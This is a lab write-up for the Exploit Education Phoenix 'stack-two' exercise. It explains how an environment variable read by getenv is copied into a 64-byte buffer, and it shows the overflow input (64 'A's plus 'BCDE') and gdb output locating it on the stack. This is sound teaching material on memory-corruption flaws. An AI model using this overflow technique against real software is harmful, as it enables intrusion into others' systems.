# stack-two

In the previous excercise, we learned that the function `strcopy` is vulnerable to buffer overflows. This time, we cannot give input directly to the program. The `src` parameter is now given the  char pointer `ptr`. The man page for `getenv` tells us: 

> The getenv() function searches the environment list to find the environment variable name, and returns a pointer to the corresponding value string.

If there exists an environment variable named "ExploitEducation", `ptr` will point to the first address of the array of chars that hold the value of the environment variable. We can therefore control the "input"/src to strcopy just like in the previous excercise by just setting the environment variable to whatever we want.

The buffer is still 64 bytes, so let is begin by setting the environment variable as follows before launching gdb:

```console
user@phoenix-amd64:/opt/phoenix/amd64$ export ExploitEducation=$(python -c 'print("A"*64 + "BCDE")')
```

(gbd inherits environment variables from the terminal, and stack-two inherts environment variables from gdb.)

In gdb, we set a breakpoint at the beginning of main and run the program. Environment variables are stored at the very beginning of the stack, so let us print a few strings from there. The command `info proc mappings` shows us where the stack is located in virtual memory. See the output below. The stack grows downwards from `0x7ffffffff000`, even though the column says "End Addr".

```console
gef➤  break main
Breakpoint 1 at 0x4006b1
gef➤  r
Starting program: /opt/phoenix/amd64/stack-two

Breakpoint 1, 0x00000000004006b1 in main ()
gef➤  info proc mappings
process 412
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /opt/phoenix/amd64/stack-two
            0x600000           0x601000     0x1000        0x0 /opt/phoenix/amd64/stack-two
      0x7ffff7d6b000     0x7ffff7dfb000    0x90000        0x0 /opt/phoenix/x86_64-linux-musl/lib/libc.so
      0x7ffff7ff6000     0x7ffff7ff8000     0x2000        0x0 [vvar]
      0x7ffff7ff8000     0x7ffff7ffa000     0x2000        0x0 [vdso]
      0x7ffff7ffa000     0x7ffff7ffb000     0x1000    0x8f000 /opt/phoenix/x86_64-linux-musl/lib/libc.so
      0x7ffff7ffb000     0x7ffff7ffc000     0x1000    0x90000 /opt/phoenix/x86_64-linux-musl/lib/libc.so
      0x7ffff7ffc000     0x7ffff7fff000     0x3000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

The output below shows a few strings from the beginning of the stack. 

```console
gef➤  x/-50s 0x7ffffffff000
...output omitted...
0x7fffffffee02: "USER=user"
0x7fffffffee0c: "PWD=/opt/phoenix/amd64"
0x7fffffffee23: "LINES=33"
0x7fffffffee2c: "HOME=/home/user"
0x7fffffffee3c: "LC_CTYPE=C.UTF-8"
0x7fffffffee98: "SSH_TTY=/dev/pts/0"
0x7fffffffeeab: "COLUMNS=165"
0x7fffffffeeb7: "MAIL=/var/mail/user"
0x7fffffffeecb: "SHELL=/bin/bash"
0x7fffffffeedb: "TERM=screen"
0x7fffffffeee7: "SHLVL=1"
0x7fffffffef08: "ExploitEducation=", 'A' <repeats 64 times>, "BCDE"
0x7fffffffef5e: "LOGNAME=user"
0x7fffffffef6b: "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
0x7fffffffefdb: "/opt/phoenix/amd64/stack-two"
0x7fffffffeff8: ""
0x7fffffffeff9: ""
0x7fffffffeffa: ""
0x7fffffffeffb: ""
0x7fffffffeffc: ""
0x7fffffffeffd: ""
0x7fffffffeffe: ""
0x7fffffffefff: ""
0x7ffffffff000: <error: Cannot access memory at address 0x7ffffffff000>
```

_(I have removed a few uninteresting environment variables from the output above to make it more compact.)_ 



